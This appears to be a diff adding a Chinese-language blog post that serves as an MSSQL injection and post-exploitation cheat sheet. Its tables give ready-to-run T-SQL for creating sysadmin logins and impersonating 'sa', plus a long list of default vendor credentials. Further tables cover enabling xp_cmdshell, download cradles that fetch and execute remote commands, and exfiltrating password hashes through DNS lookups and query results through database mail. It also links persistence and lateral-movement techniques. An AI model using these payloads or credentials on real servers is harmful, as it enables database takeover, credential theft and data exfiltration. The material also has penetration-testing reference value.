+<td>按数据库大小搜索</td>
+<td>SELECT a.database_id as [dbid], a.name, HAS_DBACCESS(a.name) as [has_dbaccess], SUSER_SNAME(a.owner_sid) as [db_owner], a.is_trustworthy_on, a.is_db_chaining_on, a.is_broker_enabled, a.is_encrypted, a.is_read_only, a.create_date, a.recovery_model_desc, b.filename, (SELECT CAST(SUM(size) * 8. &#x2F; 1024 AS DECIMAL(8,2)) from sys.master_files where name like a.name) as [DbSizeMb] FROM [sys].[databases] a INNER JOIN [sys].[sysdatabases] b ON a.database_id &#x3D; b.dbid ORDER BY DbSizeMb DESC</td>
+</tr>
+</tbody></table>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>*需要特权用户。以下查询需要各种权限类型。请继续关注详细的权限提升路径。</p>
+<table>
+<thead>
+<tr>
+<th><strong>建立DBA用户</strong></th>
+<th>*** EXEC master.dbo.sp_addsrvrolemember ‘user’, ‘sysadmin’;**</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>授予所有自定义对象的执行权限</td>
+<td>SELECT ‘grant exec on ‘ + QUOTENAME(ROUTINE_SCHEMA) + ‘.’ + QUOTENAME(ROUTINE_NAME) + ‘ TO test’ FROM INFORMATION_SCHEMA.ROUTINES WHERE OBJECTPROPERTY(OBJECT_ID(ROUTINE_NAME),’IsMSShipped’) &#x3D; 0 ;</td>
+</tr>
+<tr>
+<td>授予执行所有存储过程</td>
+<td>CREATE ROLE db_executor GRANT EXECUTE TO db_executor exec sp_addrolemember ‘db_executor’, ‘YourSecurityAccount’</td>
+</tr>
+<tr>
+<td>UNC路径注入</td>
+<td><a target="_blank" rel="noopener" href="https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e">https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e</a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/">https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>检测非模拟登录</td>
+<td>SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_ principals b ON a.grantor_principal_id &#x3D; b.principal_id WHERE a.permission_name &#x3D; ‘IMPERSONATE’</td>
+</tr>
+<tr>
+<td>模拟登录 注意：REVERT会将您带回原始登录名。</td>
+<td>EXECUTE AS LOGIN &#x3D; ‘sa’; SELECT @@VERSION;</td>
+</tr>
+<tr>
+<td>创建sysadmin用户</td>
+<td>* USE [master] GO CREATE LOGIN [test] WITH PASSSWORD&#x3D;N ‘test’, DEFAULT_DATABASE&#x3D;[master], CHECK_EXPIRATION&#x3D;OFF, CHECK_POLICY&#x3D;OFF GO EXEC master..sp_addsrvrolemember @loginame&#x3D;N’test’, @rolename&#x3D;N’sysadmin’ GO</td>
+</tr>
+<tr>
+<td>创建sysadmin用户</td>
+<td>* EXEC sp_addlogin ‘user’, ‘pass’; *EXEC master.dbo.sp_addsrvrolemember ‘user’, ‘sysadmin’;</td>
+</tr>
+<tr>
+<td>删除用户</td>
+<td>* EXEC sp_droplogin ‘user’;</td>
+</tr>
+<tr>
+<td>检索SQL代理连接密码</td>
+<td>exec msdb.dbo.sp_get_sqlagent_properties</td>
+</tr>
+<tr>
+<td>检索DTS连接密码</td>
+<td>select msdb.dbo.rtbldmbprops</td>
+</tr>
+<tr>
+<td>获取sysadmin作为本地管理员</td>
+<td><a target="_blank" rel="noopener" href="https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/">https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/</a></td>
+</tr>
+<tr>
+<td>启动存储过程</td>
+<td><a target="_blank" rel="noopener" href="https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/">https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/</a></td>
+</tr>
+<tr>
+<td>触发器创建</td>
+<td><a target="_blank" rel="noopener" href="https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/</a></td>
+</tr>
+<tr>
+<td>Windows自动登录密码</td>
+<td><a target="_blank" rel="noopener" href="https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/">https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/</a></td>
+</tr>
+<tr>
+<td>xp_regwrite非sysadmin执行</td>
+<td><a target="_blank" rel="noopener" href="https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e">https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e</a></td>
+</tr>
+<tr>
+<td>具有可信赖数据库的存储过程</td>
+<td><a target="_blank" rel="noopener" href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases</a></td>
+</tr>
+<tr>
+<td>存储过程用户模拟</td>
+<td><a target="_blank" rel="noopener" href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/</a></td>
+</tr>
+<tr>
+<td>默认密码</td>
+<td>sa:sa sa:[empty] [username]:[username]</td>
+</tr>
+<tr>
+<td>实例的默认密码（实例名称，用户，密码）</td>
+<td>“ACS”,”ej”,”ej” “ACT7”,”sa”,”sage” “AOM2”,”admin”,”ca_admin” “ARIS”,”ARIS9”,”*ARIS!1dm9n#” “AutodeskVault”,”sa”,”AutodeskVault@26200” “BOSCHSQL”,”sa”,”RPSsql12345” “BPASERVER9”,”sa”,”AutoMateBPA9” “CDRDICOM”,”sa”,”CDRDicom50!” “CODEPAL”,”sa”,”Cod3p@l” “CODEPAL08”,”sa”,”Cod3p@l” “CounterPoint”,”sa”,”CounterPoint8” “CSSQL05”,”ELNAdmin”,”ELNAdmin” “CSSQL05”,”sa”,”CambridgeSoft_SA” “CADSQL”,”CADSQLAdminUser”,”Cr41g1sth3M4n!” “DHLEASYSHIP”,”sa”,”DHLadmin@1” “DPM”,”admin”,”ca_admin” “DVTEL”,”sa”,”” “EASYSHIP”,”sa”,”DHLadmin@1” “ECC”,”sa”,”Webgility2011” “ECOPYDB”,”e+C0py2007_@x”,”e+C0py2007_@x” “ECOPYDB”,”sa”,”ecopy” “Emerson2012”,”sa”,”42Emerson42Eme” “HDPS”,”sa”,”sa” “HPDSS”,”sa”,”Hpdsdb000001” “HPDSS”,”sa”,”hpdss” “INSERTGT”,”msi”,”keyboa5” “INSERTGT”,”sa”,”” “INTRAVET”,”sa”,”Webster#1” “MYMOVIES”,”sa”,”t9AranuHA7” “PCAMERICA”,”sa”,”pcAmer1ca” “PCAMERICA”,”sa”,”PCAmerica” “PRISM”,”sa”,”SecurityMaster08” “RMSQLDATA”,”Super”,”Orange” “RTCLOCAL”,”sa”,”mypassword” “SALESLOGIX”,”sa”,”SLXMaster” “SIDEXIS_SQL”,”sa”,”2BeChanged” “SQL2K5”,”ovsd”,”ovsd” “SQLEXPRESS”,”admin”,”ca_admin” “STANDARDDEV2014”,”test”,”test” “TEW_SQLEXPRESS”,”tew”,”tew” “vocollect”,”vocollect”,”vocollect” “VSDOTNET”,”sa”,”” “VSQL”,”sa”,”111”</td>
+</tr>
+</tbody></table>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><table>
+<thead>
+<tr>
+<th><strong>名称</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>xp_cmdshell</td>
+<td>– Enable show advanced options sp_configure ‘show advanced options’, 1 RECONFIGURE GO – Enable xp_cmdshell sp_configure ‘xp_cmdshell’, 1 RECONFIGURE GO EXEC xp_cmdshell ‘net user’</td>
+</tr>
+<tr>
+<td>写入注册表自动运行</td>
+<td><a target="_blank" rel="noopener" href="https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/">https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/</a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e">https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e</a></td>
+<td></td>
+</tr>
+<tr>
+<td>写入文件自动运行</td>
+<td><a target="_blank" rel="noopener" href="https://blog.netspi.com/how-to-hack-database-links-in-sql-server/">https://blog.netspi.com/how-to-hack-database-links-in-sql-server/</a></td>
+</tr>
+<tr>
+<td>Agent Job</td>
+<td><a target="_blank" rel="noopener" href="https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution">https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution</a></td>
+</tr>
+<tr>
+<td>存储过程中的SQL注入</td>
+<td><a target="_blank" rel="noopener" href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/</a></td>
+</tr>
+<tr>
+<td>CLR组件</td>
+<td><a target="_blank" rel="noopener" href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/">https://blog.netspi.com/attacking-sql-server-clr-assemblies/</a></td>
+</tr>
+<tr>
+<td>自定义扩展存储过程</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/cmd_exec.cpp">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/cmd_exec.cpp</a></td>
+</tr>
+</tbody></table>
+<h4 id="TSQL"><a href="#TSQL" class="headerlink" title="TSQL"></a>TSQL</h4><table>
+<thead>
+<tr>
+<th><strong>名称</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ActiveX Javascript Agent Job</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_jscript.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_jscript.sql</a></td>
+</tr>
+<tr>
+<td>ActiveX VBScript Agent Job</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_vbscript.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_vbscript.sql</a></td>
+</tr>
+<tr>
+<td>cmdexec Agent Job</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_cmdexec.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_cmdexec.sql</a></td>
+</tr>
+<tr>
+<td>Powershell Agent Job</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_powershell.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_powershell.sql</a></td>
+</tr>
+<tr>
+<td>自定义命令行shell</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_customxp.cpp">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_customxp.cpp</a></td>
+</tr>
+<tr>
+<td>OLE自动化对象</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_oleautomationobject.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_oleautomationobject.sql</a></td>
+</tr>
+<tr>
+<td>OPENROWSET</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_openrowset.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_openrowset.sql</a></td>
+</tr>
+<tr>
+<td>Python</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_pythonscript.tsql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_pythonscript.tsql</a></td>
+</tr>
+<tr>
+<td>R</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_rscript.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_rscript.sql</a></td>
+</tr>
+<tr>
+<td>xp_cmdshell proxy</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_xpcmdshell_proxy.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_xpcmdshell_proxy.sql</a></td>
+</tr>
+</tbody></table>
+<h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><p>*需要特权用户</p>
+<table>
+<thead>
+<tr>
+<th><strong>描述</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>在服务器中下载Cradle bulk - TSQL</td>
+<td>– Bulk Insert - Download Cradle Example – Setup variables Declare @cmd varchar(8000) – Create temp table CREATE TABLE #file (content nvarchar(4000)); – Read file into temp table - web server must support propfind BULK INSERT #file FROM ‘\sharepoint.acme.com@SSL\Path\to\file.txt’; – Select contents of file SELECT @cmd &#x3D; content FROM #file – Display command SELECT @cmd – Run command EXECUTE(@cmd) – Drop the temp table DROP TABLE #file</td>
+</tr>
+<tr>
+<td>下载Cradle OAP 1 - SQL</td>
+<td>– OLE Automation Procedure - Download Cradle Example – Does not require a table, but can’t handle larger payloads – Note: This also works with unc paths \ip\file.txt – Note: This also works with webdav paths \ip@80\file.txt However, the target web server needs to support propfind. – Setup Variables DECLARE @url varchar(300) DECLARE @WinHTTP int DECLARE @handle int DECLARE @Command varchar(8000 – Set target url containting TSQL SET @url &#x3D; ‘<a target="_blank" rel="noopener" href="http://127.0.0.1/mycmd.txt">http://127.0.0.1/mycmd.txt</a></td>
+</tr>
+</tbody></table>
+<p>‘ – Setup namespace EXEC @handle&#x3D;sp_OACreate ‘WinHttp.WinHttpRequest.5.1’,@WinHTTP OUT – Call the Open method to setup the HTTP request EXEC @handle&#x3D;sp_OAMethod @WinHTTP, ‘Open’,NULL,’GET’,@url,’false’ – Call the Send method to send the HTTP GET request EXEC @handle&#x3D;sp_OAMethod @WinHTTP,’Send’ – Capture the HTTP response content EXEC @handle&#x3D;sp_OAGetProperty @WinHTTP,’ResponseText’, @Command out – Destroy the object EXEC @handle&#x3D;sp_OADestroy @WinHTTP – Display command SELECT @Command – Run command EXECUTE (@Command) |<br>| 下载Cradle OAP 2 - TSQL |  – OLE Automation Procedure - Download Cradle Example - Option 2 – Can handle larger payloads, but requires a table – Note: This also works with unc paths \ip\file.txt – Note: This also works with webdav paths \ip@80\file.txt However, the target web server needs to support propfind. – Setup Variables DECLARE @url varchar(300) DECLARE @WinHTTP int DECLARE @Handle int DECLARE @Command varchar(8000) – Set target url containting TSQL SET @url &#x3D; ‘<a target="_blank" rel="noopener" href="http://127.0.0.1/mycmd.txt">http://127.0.0.1/mycmd.txt</a><br>‘ – Create temp table to store downloaded string CREATE TABLE #text(html text NULL) – Setup namespace EXEC @Handle&#x3D;sp_OACreate ‘WinHttp.WinHttpRequest.5.1’,@WinHTTP OUT – Call open method to configure HTTP request EXEC @Handle&#x3D;sp_OAMethod @WinHTTP, ‘Open’,NULL,’GET’,@url,’false’ – Call Send method to send the HTTP request EXEC @Handle&#x3D;sp_OAMethod @WinHTTP,’Send’ – Capture the HTTP response content INSERT #text(html) EXEC @Handle&#x3D;sp_OAGetProperty @WinHTTP,’ResponseText’ – Destroy the object EXEC @Handle&#x3D;sp_OADestroy @WinHTTP – Display the commad SELECT @Command &#x3D; html from #text SELECT @Command – Run the command EXECUTE (@Command) – Remove temp table DROP TABLE #text |<br>| 读取文件 - TSQL | <a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceTxt.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceTxt.sql</a><br><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_BulkInsert.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_BulkInsert.sql</a><br><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceXlsx">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceXlsx</a><br><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetBulk.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetBulk.sql</a><br><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetTxt.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetTxt.sql</a><br><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetXlsx.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetXlsx.sql</a> |<br>| 写文件 - TSQL | <a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql</a><br><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_OpenRowSetTxt.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_OpenRowSetTxt.sql</a> |</p>
+<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>*需要特权用户</p>
+<table>
+<thead>
+<tr>
+<th><strong>描述</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>创建用户</td>
+<td>EXEC sp_addlogin ‘user’, ‘pass’;</td>
+</tr>
+<tr>
+<td>删除用户</td>
+<td>EXEC sp_droplogin ‘user’;</td>
+</tr>
+<tr>
+<td>链接抓取</td>
+<td><a target="_blank" rel="noopener" href="https://blog.netspi.com/sql-server-link-crawling-powerupsql/">https://blog.netspi.com/sql-server-link-crawling-powerupsql/</a></td>
+</tr>
+<tr>
+<td>作为当前服务连接到远程数据库</td>
+<td>–Requires sysadmin SELECT * FROM OPENDATASOURCE(‘SQLNCLI’, ‘Server&#x3D;MSSQLSRV04\SQLSERVER2016;Trusted_Connection&#x3D;yes;’).master.dbo.sysdatabases</td>
+</tr>
+</tbody></table>
+<h3 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h3><p>注意：可以从MSSQL发出DNS请求。但是，此请求需要管理员权限和SQL Server 2005。</p>
+<table>
+<thead>
+<tr>
+<th><strong>描述</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>制造DNS请求</td>
+<td>DECLARE @host varchar(800); select @host &#x3D; name + ‘-‘ + master.sys.fn_varbintohexstr(password_hash) + ‘netspi.com’ from sys.sql_logins;exec(‘xp_fileexist “\‘ + @host + ‘c$boot.ini”‘);</td>
+</tr>
+<tr>
+<td>UNC路径（DNS请求）</td>
+<td>xp_dirtree ‘\\data.domain.com\file’</td>
+</tr>
+<tr>
+<td>启用sp_send_dbmail并发送查询</td>
+<td>sp_configure ‘show advanced options’, 1;RECONFIGURE;sp_configure ‘Database Mail XPs’, 1;RECONFIGURE;exec msdb..sp_send_dbmail @recipients&#x3D;‘<a href="mailto:&#x68;&#97;&#x72;&#111;&#108;&#x64;&#x40;&#110;&#x65;&#116;&#115;&#x70;&#105;&#x2e;&#99;&#x6f;&#x6d;">&#x68;&#97;&#x72;&#111;&#108;&#x64;&#x40;&#110;&#x65;&#116;&#115;&#x70;&#105;&#x2e;&#99;&#x6f;&#x6d;</a>‘,@query&#x3D;’select @@version’;</td>
+</tr>
+<tr>
+<td>基本的xp_sendmail查询</td>
+<td>EXEC master..xp_sendmail ‘<a href="mailto:&#x68;&#x61;&#114;&#111;&#x6c;&#100;&#64;&#110;&#101;&#x74;&#115;&#112;&#x69;&#x2e;&#x63;&#x6f;&#109;">&#x68;&#x61;&#114;&#111;&#x6c;&#100;&#64;&#110;&#101;&#x74;&#115;&#112;&#x69;&#x2e;&#x63;&#x6f;&#109;</a>‘, ‘This is a test.’</td>
+</tr>
+<tr>
+<td>使用xp_sendmail发送完整的电子邮件</td>
+<td>EXEC xp_sendmail @recipients&#x3D;‘<a href="mailto:&#x68;&#97;&#114;&#x6f;&#108;&#100;&#64;&#x6e;&#101;&#116;&#115;&#x70;&#105;&#46;&#99;&#x6f;&#109;">&#x68;&#97;&#114;&#x6f;&#108;&#100;&#64;&#x6e;&#101;&#116;&#115;&#x70;&#105;&#46;&#99;&#x6f;&#109;</a>‘, @message&#x3D;’This is a test.’, @copy_recipients&#x3D;‘<a href="mailto:&#116;&#101;&#115;&#x74;&#x40;&#x6e;&#101;&#x74;&#115;&#x70;&#x69;&#46;&#x63;&#111;&#109;">&#116;&#101;&#115;&#x74;&#x40;&#x6e;&#101;&#x74;&#115;&#x70;&#x69;&#46;&#x63;&#111;&#109;</a>‘, @subject&#x3D;’TEST’</td>
+</tr>
+<tr>
+<td>通过xp_sendmail发送查询结果</td>
+<td>EXEC xp_sendmail ‘<a href="mailto:&#104;&#x61;&#114;&#x6f;&#108;&#100;&#64;&#110;&#101;&#x74;&#115;&#x70;&#105;&#46;&#99;&#x6f;&#x6d;">&#104;&#x61;&#114;&#x6f;&#108;&#100;&#64;&#110;&#101;&#x74;&#115;&#x70;&#105;&#46;&#99;&#x6f;&#x6d;</a>‘, @query&#x3D;’SELECT @@version’;</td>
+</tr>
+<tr>
+<td>通过xp_sendmail发送查询结果作为附件</td>
+<td>CREATE TABLE ##texttab (c1 text) INSERT ##texttab values (‘Put messge here.’) DECLARE @cmd varchar(56)SET @cmd &#x3D; ‘SELECT c1 from ##texttab’EXEC master.dbo.xp_sendmail ‘robertk’,@query &#x3D; @cmd, @no_header&#x3D;’TRUE’DROP TABLE ##texttab</td>
+</tr>
+</tbody></table>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><table>
+<thead>
+<tr>
+<th><strong>描述</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>启动存储过程</td>
+<td><a target="_blank" rel="noopener" href="https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/">https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/</a></td>
+</tr>
+<tr>
+<td>触发器</td>
+<td><a target="_blank" rel="noopener" href="https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/</a></td>
+</tr>
+<tr>
+<td>Regwrite</td>
+<td><a target="_blank" rel="noopener" href="https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/">https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/</a></td>
+</tr>
+</tbody></table>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>m0sway</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2022/02/18/Mssql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/">http://example.com/2022/02/18/Mssql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Mssql/"># Mssql</a>
+                    
+                        <a href="/tags/SQL-Server/"># SQL Server</a>
+                    
+                        <a href="/tags/SQLi/"># SQLi</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/02/19/Oracle%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/">Oracle注入备忘录</a>
+            
+            
+            <a class="next" rel="next" href="/2022/02/17/Mysql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/">Mysql注入备忘录</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© m0sway
+    </div>
+    
+        <!-- 统计 -->
+        <span id="busuanzi_container_site_pv">
+                访问量: <span id="busuanzi_value_site_pv"></span>
+        </span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv" style='display:none'>
+                访客: <span id="busuanzi_value_site_uv"></span>
+        </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+</footer>
+
+    </div>
+</body>
+
+</html>
